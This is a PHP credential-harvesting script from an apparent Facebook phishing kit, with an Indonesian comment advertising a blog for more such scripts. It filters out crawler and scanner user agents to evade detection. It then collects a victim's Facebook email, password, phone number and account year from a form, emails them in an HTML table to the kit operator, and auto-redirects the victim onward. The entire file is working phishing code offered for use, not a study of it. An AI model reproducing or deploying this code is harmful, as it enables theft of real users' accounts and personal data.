<!-- https://www.RaBiitch.ga/ - Kujungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/');
die();
}
$f = $_POST['efbi'];
$pf = $_POST['efbipw'];
$t = $_POST['tel'];
$tt = $_POST['tgl'];


if(empty($f) || empty($pf) || empty($t) || empty($tt)) {
    header: ('location: ./');
} else {
    include 'email.php';
    $body = <<<EOD
    <html><head><meta charset="UTF-8"><style>@font-face {font-family: "RaBiitch";src: url(./assets/fonts/supercell.ttf);} #RaBiitch {font-family: "RaBiitch";border-collapse: collapse;width: 90%;
    margin: auto;}#RaBiitch td, #RaBiitch th {border: 1px solid #ddd;padding: 8px;}#RaBiitch tr:nth-child(even){background-color: #f2f2f2;}#RaBiitch tr:hover {background-color: #ddd;}
    #RaBiitch th {padding-top: 12px;padding-bottom: 12px;text-align: left;background-color: #4CAF50;color: white;}</style></head>
    <body>
    <table id='RaBiitch'>
    <tr><th>Data Facebook</th></tr>
    <tr><td>Email : $f</td></tr>
    <tr><td>Password: $pf</td></tr>
    <tr><td>No Hp : $t</td></tr>
    <tr><td>Akun Tahun : $tt</td></tr>
    </table>
    </body>
    </html>
EOD;
    $subjek = 'AKUN FB SI "'.$f.'" MASUK!';
    $headers = "From: Machsop\r\n";
    $headers .= "Content-type: text/html\r\n";
    $success = mail($mailto, $subjek, $body, $headers);
    $random = rand(1000,5000);

    if($success) {
        echo "<form id='autoea' action='./join.php' method='POST'>
    </form>
    <script type='text/javascript'>document.getElementById('autoea').submit();</script>";
    }
}
?>